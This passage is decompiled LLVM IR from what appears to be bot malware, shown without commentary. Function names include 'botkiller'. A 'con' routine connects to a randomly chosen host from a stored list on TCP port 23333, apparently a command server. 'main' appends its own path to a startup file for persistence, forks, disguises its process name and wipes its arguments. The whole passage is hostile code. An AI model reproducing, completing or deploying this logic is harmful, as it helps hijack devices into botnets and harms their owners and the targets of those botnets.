  %stack_var_-60.339 = phi i32 [ 0, %dec_label_pc_10001ba8 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10001c2c ]
  store i32 %stack_var_-60.339, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001be428 = call i32 @__GI_strlen()
  %v0_10001bec29 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001bec30 = icmp ult i32 %v0_10001bec29, %v0_10001be428
  br i1 %v2_10001bec30, label %dec_label_pc_10001bf4, label %dec_label_pc_10001c08

dec_label_pc_10001c5c.preheader:                  ; preds = %dec_label_pc_10001c2c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001c0c, i32* @r3, align 4
  %v0_10001c6419 = call i32 @__GI_strlen()
  %v0_10001c6c20 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c6c21 = icmp ult i32 %v0_10001c6c20, %v0_10001c6419
  br i1 %v2_10001c6c21, label %dec_label_pc_10001c74, label %dec_label_pc_10001c94

dec_label_pc_10001c50:                            ; preds = %dec_label_pc_10001c74
  %v1_10001c54 = add i32 %storemerge1224, 1
  store i32 %v1_10001c54, i32* %r29.global-to-local, align 4
  store i32 %v1_10001c0c, i32* @r3, align 4
  %v0_10001c64 = call i32 @__GI_strlen()
  %v0_10001c6c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c6c = icmp ult i32 %v0_10001c6c, %v0_10001c64
  br i1 %v2_10001c6c, label %dec_label_pc_10001c74, label %dec_label_pc_10001c94

dec_label_pc_10001c74:                            ; preds = %dec_label_pc_10001c5c.preheader, %dec_label_pc_10001c50
  %storemerge1224 = phi i32 [ %v1_10001c54, %dec_label_pc_10001c50 ], [ 0, %dec_label_pc_10001c5c.preheader ]
  %v2_10001c80 = add i32 %storemerge1224, %v1_10001c0c
  %v1_10001c84 = inttoptr i32 %v2_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 32
  br i1 %v3_10001c8c, label %dec_label_pc_10001c94, label %dec_label_pc_10001c50

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c50, %dec_label_pc_10001c74, %dec_label_pc_10001c5c.preheader
  %storemerge12.lcssa = phi i32 [ 0, %dec_label_pc_10001c5c.preheader ], [ %v1_10001c54, %dec_label_pc_10001c50 ], [ %storemerge1224, %dec_label_pc_10001c74 ]
  %v2_10001ca0 = add i32 %storemerge12.lcssa, %v1_10001c0c
  %v3_10001ca8 = inttoptr i32 %v2_10001ca0 to i8*
  store i8 0, i8* %v3_10001ca8, align 1
  store i32 268442804, i32* @lr, align 4
  %v2_10001cb0 = call i32 @inet_addr(i32 %v1_10001c0c)
  %v5_10001cb8 = trunc i32 %v2_10001cb0 to i8
  store i8 %v5_10001cb8, i8* %stack_var_-56, align 1
  %v4_10001cc4 = icmp eq i8 %v5_10001cb8, -1
  br i1 %v4_10001cc4, label %dec_label_pc_10001ccc, label %dec_label_pc_10001d14

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94
  store i32 268442836, i32* @lr, align 4
  %v3_10001cd0 = call i32 @__GI_gethostbyname(i32 %v1_10001c0c, i32 %v2_10001cb0)
  %v3_10001ce0 = icmp eq i32 %v3_10001cd0, 0
  br i1 %v3_10001ce0, label %dec_label_pc_10001d8c, label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001ccc
  %v2_10001ce8 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10001cf0 = add i32 %v3_10001cd0, 16
  %v2_10001cf0 = inttoptr i32 %v1_10001cf0 to i32*
  %v3_10001cf0 = load i32, i32* %v2_10001cf0, align 4
  %v1_10001cf4 = inttoptr i32 %v3_10001cf0 to i32*
  %v2_10001cf4 = load i32, i32* %v1_10001cf4, align 4
  %v1_10001cfc = add i32 %v3_10001cd0, 12
  %v2_10001cfc = inttoptr i32 %v1_10001cfc to i32*
  %v3_10001cfc = load i32, i32* %v2_10001cfc, align 4
  store i32 %v2_10001ce8, i32* @r3, align 4
  store i32 %v2_10001cf4, i32* @r4, align 4
  store i32 %v3_10001cfc, i32* @r5, align 4
  store i32 268442900, i32* @lr, align 4
  %v0_10001d10 = call i32 @memcpy()
  %v2_10001d24.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10001d14

dec_label_pc_10001d14:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001ce8
  %v0_10001da476 = phi i32 [ %v0_10001d10, %dec_label_pc_10001ce8 ], [ %v2_10001cb0, %dec_label_pc_10001c94 ]
  %v2_10001d24 = phi i8 [ %v2_10001d24.pre, %dec_label_pc_10001ce8 ], [ %v5_10001cb8, %dec_label_pc_10001c94 ]
  store i8 %v2_10001d24, i8* bitcast (i8** @global_var_1001d82f.300 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1001d82c.299 to i8*), align 4
  store i32 256, i32* @global_var_1001d830.298, align 4
  br label %dec_label_pc_10001d8c

dec_label_pc_10001d8c:                            ; preds = %dec_label_pc_10001ad4, %dec_label_pc_10001c08, %dec_label_pc_10001b98, %dec_label_pc_10001b60, %dec_label_pc_10001ccc, %dec_label_pc_10001d14
  %v0_10001da4 = phi i32 [ 0, %dec_label_pc_10001b98 ], [ %v3_10001b88, %dec_label_pc_10001b60 ], [ 0, %dec_label_pc_10001ccc ], [ %v0_10001da476, %dec_label_pc_10001d14 ], [ %v0_10001c1c, %dec_label_pc_10001c08 ], [ %v0_10001ae8, %dec_label_pc_10001ad4 ]
  %v2_10001d8c = load i32, i32* %stack_var_-80, align 4
  %v1_10001d98 = add i32 %v2_10001d8c, -12
  %v2_10001d98 = inttoptr i32 %v1_10001d98 to i32*
  %v3_10001d98 = load i32, i32* %v2_10001d98, align 4
  store i32 %v3_10001d98, i32* %r29.global-to-local, align 4
  ret i32 %v0_10001da4

; uselistorder directives
  uselistorder i32 %v2_10001cb0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.339, { 2, 0, 1 }
  uselistorder i32 %v1_10001c30, { 1, 0 }
  uselistorder i32 %v1_10001c0c, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.163, { 2, 0, 1 }
  uselistorder i32 %v1_10001afc, { 1, 0 }
  uselistorder i32 %v1_10001ad8, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 13, 14, 15, 16, 3, 4, 5, 6, 7, 8, 17, 18, 19, 20, 9, 10, 11, 12 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001d8c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10001d14, { 1, 0 }
  uselistorder label %dec_label_pc_10001c94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001c74, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001c08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001b60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001b40, { 1, 0 }
  uselistorder label %dec_label_pc_10001aa8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001ad4, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %v3_10001dcc = load i32, i32* @global_var_1001d844.289, align 4
  store i32 %v3_10001dcc, i32* @r3, align 4
  store i32 268443096, i32* @lr, align 4
  %v0_10001dd4 = call i32 @free()
  store i32 268443112, i32* @lr, align 4
  %v2_10001de4 = call i32 @makestring(i32 %v0_10001dd4, i32 268500992)
  %v2_10001df0 = ptrtoint i32* %stack_var_-80 to i32
  %v4_10001dfc = call i32 @strcpy(i32 %v2_10001df0, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1000b8ec.303, i32 0, i32 0))
  store i32 %v2_10001de4, i32* @r4, align 4
  %v2_10001e0c = bitcast i32* %stack_var_-80 to i8*
  %v3_10001e0c = call i32 @strcat(i8* %v2_10001e0c, i32 %v2_10001de4)
  store i32 %v2_10001df0, i32* @global_var_1001d844.289, align 4
  %v2_10001e1c = call i32 @botkiller(i32 %v3_10001e0c, i32 268566528)
  ret i32 %v2_10001e1c

; uselistorder directives
  uselistorder i32 %v2_10001de4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10001f70 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10001f74 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10001fcc = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10001e50

dec_label_pc_10001e50:                            ; preds = %dec_label_pc_10001e50.backedge, %entry
  store i32 -1, i32* @global_var_1001d848.304, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10001e68 = load i32, i32* @global_var_1001d824.305, align 4
  %v3_10001e6c = icmp eq i32 %v3_10001e68, 0
  br i1 %v3_10001e6c, label %dec_label_pc_10001e74, label %dec_label_pc_10001eac

dec_label_pc_10001e74:                            ; preds = %dec_label_pc_10001e50
  store i32 268443256, i32* @lr, align 4
  %v0_10001e74 = call i32 @random()
  %v3_10001e80 = load i32, i32* @global_var_1001d7d8.306, align 4
  %v2_10001e84 = srem i32 %v0_10001e74, %v3_10001e80
  %v1_10001e98 = mul i32 %v2_10001e84, 4
  %v2_10001e9c = add i32 %v1_10001e98, ptrtoint ([22 x i8]** @global_var_1001d7dc.308 to i32)
  %v1_10001ea0 = inttoptr i32 %v2_10001e9c to i32*
  %v2_10001ea0 = load i32, i32* %v1_10001ea0, align 4
  store i32 %v2_10001ea0, i32* @global_var_1001d850.309, align 4
  br label %dec_label_pc_10001eac

dec_label_pc_10001eac:                            ; preds = %dec_label_pc_10001e50, %dec_label_pc_10001e74
  store i32 0, i32* @global_var_1001d824.305, align 4
  br label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %dec_label_pc_10001eb8, %dec_label_pc_10001eac
  store i32 268443336, i32* @lr, align 4
  %v3_10001ec4 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_10001ec4, i32* @global_var_1001d848.304, align 4
  %v1_10001edc = icmp slt i32 %v3_10001ec4, 0
  br i1 %v1_10001edc, label %dec_label_pc_10001eb8, label %dec_label_pc_10001ee4

dec_label_pc_10001ee4:                            ; preds = %dec_label_pc_10001eb8
  %v3_10001ee8 = load i32, i32* @global_var_1001d850.309, align 4
  store i32 268443380, i32* @lr, align 4
  %v1_10001ef0 = call i32 @inet_addr(i32 %v3_10001ee8)
  %v3_10001ef8 = icmp eq i32 %v1_10001ef0, 0
  br i1 %v3_10001ef8, label %dec_label_pc_10001f20, label %dec_label_pc_10001f00

dec_label_pc_10001f00:                            ; preds = %dec_label_pc_10001ee4
  %v3_10001f04 = load i32, i32* @global_var_1001d850.309, align 4
  store i32 268443408, i32* @lr, align 4
  %v1_10001f0c = call i32 @inet_addr(i32 %v3_10001f04)
  %v4_10001f18 = icmp eq i32 %v1_10001f0c, -1
  br i1 %v4_10001f18, label %dec_label_pc_10001f20, label %dec_label_pc_10001f94

dec_label_pc_10001f20:                            ; preds = %dec_label_pc_10001f00, %dec_label_pc_10001ee4
  %v3_10001f24 = load i32, i32* @global_var_1001d850.309, align 4
  store i32 268443440, i32* @lr, align 4
  %v2_10001f2c = call i32 @__GI_gethostbyname(i32 %v3_10001f24, i32 268566528)
  %v3_10001f3c = icmp eq i32 %v2_10001f2c, 0
  br i1 %v3_10001f3c, label %dec_label_pc_10001f44, label %dec_label_pc_10001f64

dec_label_pc_10001f44:                            ; preds = %dec_label_pc_10001f20
  store i32 0, i32* @global_var_1001d850.309, align 4
  %v3_10001f54 = load i32, i32* @global_var_1001d848.304, align 4
  store i32 268443488, i32* @lr, align 4
  %v1_10001f5c = call i32 @__libc_close(i32 %v3_10001f54)
  br label %dec_label_pc_10001e50.backedge

dec_label_pc_10001e50.backedge:                   ; preds = %dec_label_pc_10001f44, %dec_label_pc_100020fc
  br label %dec_label_pc_10001e50

dec_label_pc_10001f64:                            ; preds = %dec_label_pc_10001f20
  %v1_10001f68 = add i32 %v2_10001f2c, 16
  %v2_10001f68 = inttoptr i32 %v1_10001f68 to i32*
  %v3_10001f68 = load i32, i32* %v2_10001f68, align 4
  %v1_10001f6c = inttoptr i32 %v3_10001f68 to i32*
  %v2_10001f6c = load i32, i32* %v1_10001f6c, align 4
  %v1_10001f7c = add i32 %v2_10001f2c, 12
  %v2_10001f7c = inttoptr i32 %v1_10001f7c to i32*
  %v3_10001f7c = load i32, i32* %v2_10001f7c, align 4
  store i32 %v3_10001f7c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10001f90.310 to i32), i32* @lr, align 4
  %v4_10001f8c = call i32 @bcopy(i32 %v2_10001f6c, i32 %v2_10001f74, i32 %v3_10001f7c, i32 %v2_10001f2c)
  br label %dec_label_pc_10001fac

dec_label_pc_10001f94:                            ; preds = %dec_label_pc_10001f00
  %v3_10001f98 = load i32, i32* @global_var_1001d850.309, align 4
  store i32 268443556, i32* @lr, align 4
  %v1_10001fa0 = call i32 @inet_addr(i32 %v3_10001f98)
  store i32 %v1_10001fa0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10001fac

dec_label_pc_10001fac:                            ; preds = %dec_label_pc_10001f64, %dec_label_pc_10001f94
  store i32 2, i32* %stack_var_-28, align 4
  store i32 23333, i32* @r3, align 4
  %v1_10001fb8 = call i32 @htons(i32 23333)
  %v3_10001fc8 = load i32, i32* @global_var_1001d848.304, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001fe8.311 to i32), i32* @lr, align 4
  %v3_10001fe4 = call i32 @ioctl(i32 %v3_10001fc8, i32 -2147195266, i32 %v2_10001fcc)
  store i32 268443632, i32* @lr, align 4
  %v1_10001fec = call i32 @__GI_time(i32 0)
  store i32 268443876, i32* @lr, align 4
  %v1_100020e011 = call i32 @__GI_time(i32 0)
  %v2_100020f012 = sub i32 %v1_100020e011, %v1_10001fec
  %tmp1016 = icmp ult i32 %v2_100020f012, 10
  br i1 %tmp1016, label %dec_label_pc_10001ffc, label %dec_label_pc_100020fc

dec_label_pc_10001ffc:                            ; preds = %dec_label_pc_10001fac, %dec_label_pc_100020d4
  %v0_10001ffc = call i32 @__errno_location()
  %v2_10002008 = inttoptr i32 %v0_10001ffc to i32*
  store i32 0, i32* %v2_10002008, align 4
  %v3_10002010 = load i32, i32* @global_var_1001d848.304, align 4
  store i32 268443688, i32* @lr, align 4
  %v3_10002024 = call i32 @__libc_connect(i32 %v3_10002010, i32 %v2_10001f70, i32 16)
  %v3_1000202c = icmp eq i32 %v3_10002024, 0
  br i1 %v3_1000202c, label %dec_label_pc_10002048, label %dec_label_pc_10002034

dec_label_pc_10002034:                            ; preds = %dec_label_pc_10001ffc
  %v0_10002034 = call i32 @__errno_location()
  %v1_1000203c = inttoptr i32 %v0_10002034 to i32*
  %v2_1000203c = load i32, i32* %v1_1000203c, align 4
  %v3_10002040 = icmp eq i32 %v2_1000203c, 106
  br i1 %v3_10002040, label %dec_label_pc_10002048, label %dec_label_pc_100020ac

dec_label_pc_10002048:                            ; preds = %dec_label_pc_10002034, %dec_label_pc_10001ffc
  %v3_1000204c = load i32, i32* @global_var_1001d848.304, align 4
  store i32 268443752, i32* @lr, align 4
  %v6_10002064 = call i32 @__GI_setsockopt(i32 %v3_1000204c, i32 1, i32 13, i32 0, i32 0, i32 268566528)
  %v3_1000206c = load i32, i32* @global_var_1001d848.304, align 4
  store i32 268443784, i32* @lr, align 4
  %v6_10002084 = call i32 @__GI_setsockopt(i32 %v3_1000206c, i32 1, i32 2, i32 0, i32 0, i32 268566528)
  %v3_1000208c = load i32, i32* @global_var_1001d848.304, align 4
  store i32 ptrtoint (i32* @global_var_100020a8.312 to i32), i32* @lr, align 4
  %v6_100020a4 = call i32 @__GI_setsockopt(i32 %v3_1000208c, i32 1, i32 9, i32 0, i32 0, i32 268566528)
  ret i32 %v6_100020a4

dec_label_pc_100020ac:                            ; preds = %dec_label_pc_10002034
  %v0_100020ac = call i32 @__errno_location()
  %v1_100020b4 = inttoptr i32 %v0_100020ac to i32*
  %v2_100020b4 = load i32, i32* %v1_100020b4, align 4
  %v3_100020b8 = icmp eq i32 %v2_100020b4, 115
  br i1 %v3_100020b8, label %dec_label_pc_100020d4, label %dec_label_pc_100020c0

dec_label_pc_100020c0:                            ; preds = %dec_label_pc_100020ac
  %v0_100020c0 = call i32 @__errno_location()
  %v1_100020c8 = inttoptr i32 %v0_100020c0 to i32*
  %v2_100020c8 = load i32, i32* %v1_100020c8, align 4
  %v3_100020cc = icmp eq i32 %v2_100020c8, 114
  br i1 %v3_100020cc, label %dec_label_pc_100020d4, label %dec_label_pc_100020fc

dec_label_pc_100020d4:                            ; preds = %dec_label_pc_100020c0, %dec_label_pc_100020ac
  store i32 ptrtoint ([3 x i8]* @global_var_100020dc.313 to i32), i32* @lr, align 4
  %v1_100020d8 = call i32 @sleep(i32 1)
  store i32 268443876, i32* @lr, align 4
  %v1_100020e0 = call i32 @__GI_time(i32 0)
  %v2_100020f0 = sub i32 %v1_100020e0, %v1_10001fec
  %tmp10 = icmp ult i32 %v2_100020f0, 10
  br i1 %tmp10, label %dec_label_pc_10001ffc, label %dec_label_pc_100020fc

dec_label_pc_100020fc:                            ; preds = %dec_label_pc_100020d4, %dec_label_pc_100020c0, %dec_label_pc_10001fac
  store i32 0, i32* @global_var_1001d850.309, align 4
  %v3_1000210c = load i32, i32* @global_var_1001d848.304, align 4
  store i32 268443928, i32* @lr, align 4
  %v1_10002114 = call i32 @__libc_close(i32 %v3_1000210c)
  br label %dec_label_pc_10001e50.backedge

; uselistorder directives
  uselistorder i32 %v1_10001fec, { 1, 0 }
  uselistorder i32 %v3_10001f7c, { 1, 0 }
  uselistorder i32 %v2_10001f2c, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 268443876, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10001ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10001fac, { 1, 0 }
  uselistorder label %dec_label_pc_10001e50.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10001eac, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5144 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-6432 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-6484 = alloca i32, align 4
  %stack_var_-6168 = alloca i32, align 4
  %stack_var_-6424 = alloca i32, align 4
  %stack_var_-6740 = alloca i32, align 4
  %v1_10002158 = bitcast i8** %argv to i32*
  store i32 268444028, i32* @lr, align 4
  %v3_10002178 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1000b924.314 to i32), i32 ptrtoint (i32* @global_var_1000b80c.268 to i32))
  %v3_10002188 = icmp eq i32 %v3_10002178, 0
  br i1 %v3_10002188, label %dec_label_pc_10002190, label %dec_label_pc_100021b4

dec_label_pc_10002190:                            ; preds = %entry
  store i32 268444076, i32* @lr, align 4
  %v3_100021a8 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1000b938.315 to i32), i32 ptrtoint (i32* @global_var_1000b80c.268 to i32))
  br label %dec_label_pc_100021b4

dec_label_pc_100021b4:                            ; preds = %entry, %dec_label_pc_10002190
  %stack_var_-6756.0 = phi i32 [ %v3_100021a8, %dec_label_pc_10002190 ], [ %v3_10002178, %entry ]
  %stack_var_-6752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b938.315, i32 0, i32 0), %dec_label_pc_10002190 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b924.314, i32 0, i32 0), %entry ]
  %v3_100021b8 = icmp eq i32 %stack_var_-6756.0, 0
  br i1 %v3_100021b8, label %dec_label_pc_10002334, label %dec_label_pc_100021c0

dec_label_pc_100021c0:                            ; preds = %dec_label_pc_100021b4
  %v2_100021c4 = load i32, i32* %v1_10002158, align 4
  store i32 %v2_100021c4, i32* @r3, align 4
  %v0_100021cc = call i32 @__GI_strlen()
  %v2_100021e0 = ptrtoint i32* %stack_var_-6740 to i32
  store i32 268444144, i32* @lr, align 4
  %v2_100021ec = call i32 @getcwd(i32 %v2_100021e0, i32 256)
  store i32 ptrtoint (i32* @global_var_1000b948.316 to i32), i32* @r4, align 4
  %v2_10002200 = bitcast i32* %stack_var_-6740 to i8*
  %v3_10002200 = call i32 @__GI_strcoll(i8* %v2_10002200, i32 ptrtoint (i32* @global_var_1000b948.316 to i32))
  %v3_10002208 = icmp eq i32 %v3_10002200, 0
  br i1 %v3_10002208, label %dec_label_pc_1000232c, label %dec_label_pc_10002220.preheader

dec_label_pc_10002220.preheader:                  ; preds = %dec_label_pc_100021c0
  %v2_10002224112 = load i32, i32* %v1_10002158, align 4
  %v2_1000222c113 = add i32 %v2_10002224112, %v0_100021cc
  %v1_10002230114 = inttoptr i32 %v2_1000222c113 to i8*
  %v2_10002230115 = load i8, i8* %v1_10002230114, align 1
  %v3_10002238119 = icmp eq i8 %v2_10002230115, 47
  br i1 %v3_10002238119, label %dec_label_pc_10002240, label %dec_label_pc_10002214

dec_label_pc_10002214:                            ; preds = %dec_label_pc_10002220.preheader, %dec_label_pc_10002214
  %stack_var_-6772.0120 = phi i32 [ %v1_10002218, %dec_label_pc_10002214 ], [ %v0_100021cc, %dec_label_pc_10002220.preheader ]
  %v1_10002218 = add i32 %stack_var_-6772.0120, -1
  %v2_10002224 = load i32, i32* %v1_10002158, align 4
  %v2_1000222c = add i32 %v2_10002224, %v1_10002218
  %v1_10002230 = inttoptr i32 %v2_1000222c to i8*
  %v2_10002230 = load i8, i8* %v1_10002230, align 1
  %v3_10002238 = icmp eq i8 %v2_10002230, 47
  br i1 %v3_10002238, label %dec_label_pc_10002240, label %dec_label_pc_10002214

dec_label_pc_10002240:                            ; preds = %dec_label_pc_10002214, %dec_label_pc_10002220.preheader
  %stack_var_-6772.0.lcssa = phi i32 [ %v0_100021cc, %dec_label_pc_10002220.preheader ], [ %v1_10002218, %dec_label_pc_10002214 ]
  %v2_10002244 = load i32, i32* %v1_10002158, align 4
  %v2_1000224c = add i32 %v2_10002244, %stack_var_-6772.0.lcssa
  %v2_10002250 = ptrtoint i32* %stack_var_-6424 to i32
  store i32 %v2_10002250, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002274.318 to i32), i32* @lr, align 4
  %v6_10002270 = call i32 @sprintf(i32 %v2_10002250, i32 ptrtoint ([8 x i8]* @global_var_1000b94c.317 to i32), i32 %v2_100021e0, i32 %v2_1000224c, i32 268500992)
  %v2_10002278 = ptrtoint i32* %stack_var_-6168 to i32
  br label %dec_label_pc_100022b8.outer

dec_label_pc_10002278:                            ; preds = %dec_label_pc_100022b8
  store i32 268444300, i32* @lr, align 4
  %v3_10002288 = call i32 @fgets(i32 %v2_10002278, i32 1024, i32 %stack_var_-6756.0)
  store i32 %v2_10002278, i32* @r3, align 4
  store i32 %v2_10002250, i32* @r4, align 4
  %v2_1000229c = call i32 @__GI_strcasecmp(i32 %v2_10002278, i32 %v2_10002250)
  %v3_100022a4 = icmp eq i32 %v2_1000229c, 0
  br i1 %v3_100022a4, label %dec_label_pc_100022ac, label %dec_label_pc_100022b8

dec_label_pc_100022ac:                            ; preds = %dec_label_pc_10002278
  %v1_100022b0 = add i32 %stack_var_-6776.0.ph, 1
  br label %dec_label_pc_100022b8.outer

dec_label_pc_100022b8.outer:                      ; preds = %dec_label_pc_100022ac, %dec_label_pc_10002240
  %stack_var_-6776.0.ph = phi i32 [ %v1_100022b0, %dec_label_pc_100022ac ], [ 0, %dec_label_pc_10002240 ]
  br label %dec_label_pc_100022b8

dec_label_pc_100022b8:                            ; preds = %dec_label_pc_100022b8.outer, %dec_label_pc_10002278
  store i32 268444352, i32* @lr, align 4
  %v1_100022bc = call i32 @feof(i32 %stack_var_-6756.0)
  %v3_100022c4 = icmp eq i32 %v1_100022bc, 0
  br i1 %v3_100022c4, label %dec_label_pc_10002278, label %dec_label_pc_100022cc

dec_label_pc_100022cc:                            ; preds = %dec_label_pc_100022b8
  %v3_100022d0 = icmp eq i32 %stack_var_-6776.0.ph, 0
  br i1 %v3_100022d0, label %dec_label_pc_100022d8, label %dec_label_pc_10002320

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_100022cc
  store i32 268444384, i32* @lr, align 4
  %v1_100022dc = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_100022dc = call i32 @__GI_fclose(i16* %v1_100022dc)
  %v4_100022e0 = ptrtoint i8* %stack_var_-6752.0 to i32
  store i32 268444400, i32* @lr, align 4
  %v3_100022ec = call i32 @__GI_fopen(i32 %v4_100022e0, i32 ptrtoint (i32* @global_var_1000b954.319 to i32))
  %v3_100022fc = icmp eq i32 %v3_100022ec, 0
  br i1 %v3_100022fc, label %dec_label_pc_10002334, label %dec_label_pc_10002304

dec_label_pc_10002304:                            ; preds = %dec_label_pc_100022d8
  store i32 268444436, i32* @lr, align 4
  %v2_10002310 = call i32 @__GI_fputs(i32 %v2_10002250, i32 %v3_100022ec)
  store i32 ptrtoint (i32* @global_var_1000231c.320 to i32), i32* @lr, align 4
  %v1_10002318 = inttoptr i32 %v3_100022ec to i16*
  %v2_10002318 = call i32 @__GI_fclose(i16* %v1_10002318)
  br label %dec_label_pc_10002334

dec_label_pc_10002320:                            ; preds = %dec_label_pc_100022cc
  store i32 ptrtoint (i32* @global_var_10002328.321 to i32), i32* @lr, align 4
  %v1_10002324 = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_10002324 = call i32 @__GI_fclose(i16* %v1_10002324)
  br label %dec_label_pc_10002334

dec_label_pc_1000232c:                            ; preds = %dec_label_pc_100021c0
  store i32 ptrtoint (i32* @global_var_10002334.322 to i32), i32* @lr, align 4
  %v1_10002330 = inttoptr i32 %stack_var_-6756.0 to i16*
  %v2_10002330 = call i32 @__GI_fclose(i16* %v1_10002330)
  br label %dec_label_pc_10002334

dec_label_pc_10002334:                            ; preds = %dec_label_pc_100022d8, %dec_label_pc_100021b4, %dec_label_pc_10002320, %dec_label_pc_10002304, %dec_label_pc_1000232c
  store i32 268444472, i32* @lr, align 4
  %v0_10002334 = call i32 @__libc_fork()
  %v3_1000233c = icmp eq i32 %v0_10002334, 0
  br i1 %v3_1000233c, label %dec_label_pc_1000234c, label %dec_label_pc_10002344

dec_label_pc_10002344:                            ; preds = %dec_label_pc_10002334
  %v0_10002348 = call i32 @__GI_exit()
  br label %dec_label_pc_1000234c

dec_label_pc_1000234c:                            ; preds = %dec_label_pc_10002334, %dec_label_pc_10002344
  %v2_10002350 = load i32, i32* %v1_10002158, align 4
  store i32 %v2_10002350, i32* @r3, align 4
  %v0_10002360 = call i32 @__GI_strlen()
  store i32 ptrtoint ([14 x i8]* @global_var_1000b958.323 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000237c.324 to i32), i32* @lr, align 4
  %v4_10002378 = call i32 @strncpy(i32 %v2_10002350, i32 ptrtoint ([14 x i8]* @global_var_1000b958.323 to i32), i32 %v0_10002360)
  %v2_100023ec53 = icmp sgt i32 %argc, 1
  br i1 %v2_100023ec53, label %dec_label_pc_10002388, label %dec_label_pc_100023f4

dec_label_pc_10002388:                            ; preds = %dec_label_pc_1000234c, %dec_label_pc_10002388
  %storemerge1356 = phi i32 [ %v1_100023dc, %dec_label_pc_10002388 ], [ 1, %dec_label_pc_1000234c ]
  %v1_1000238c = mul i32 %storemerge1356, 4
  %v2_10002398 = add i32 %v1_1000238c, %tmp
  %v1_1000239c = inttoptr i32 %v2_10002398 to i32*
  %v2_1000239c = load i32, i32* %v1_1000239c, align 4
  store i32 %v2_1000239c, i32* @r3, align 4
  %v0_100023bc = call i32 @__GI_strlen()
  store i32 268444632, i32* @lr, align 4
  %v3_100023d4 = call i32 @__GI_memset(i32 %v2_1000239c, i32 0, i32 %v0_100023bc)
  %v1_100023dc = add nuw nsw i32 %storemerge1356, 1
  %v2_100023ec = icmp slt i32 %v1_100023dc, %argc
  br i1 %v2_100023ec, label %dec_label_pc_10002388, label %dec_label_pc_100023f4

dec_label_pc_100023f4:                            ; preds = %dec_label_pc_10002388, %dec_label_pc_1000234c
  store i32 268444668, i32* @lr, align 4
  %v1_100023f8 = call i32 @__GI_time(i32 0)
  store i32 268444676, i32* @lr, align 4
  %v0_10002400 = call i32 @__libc_getpid()
  %v2_10002408 = xor i32 %v1_100023f8, %v0_10002400
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @getppid()
  %v2_10002414 = add i32 %v2_10002408, %v0_1000240c
  store i32 268444704, i32* @lr, align 4
  %v1_1000241c = call i32 @srand(i32 %v2_10002414)
  store i32 268444720, i32* @lr, align 4
  %v2_1000242c = call i32 @makestring(i32 %v1_1000241c, i32 268500992)
  %v2_10002438 = ptrtoint i32* %stack_var_-6484 to i32
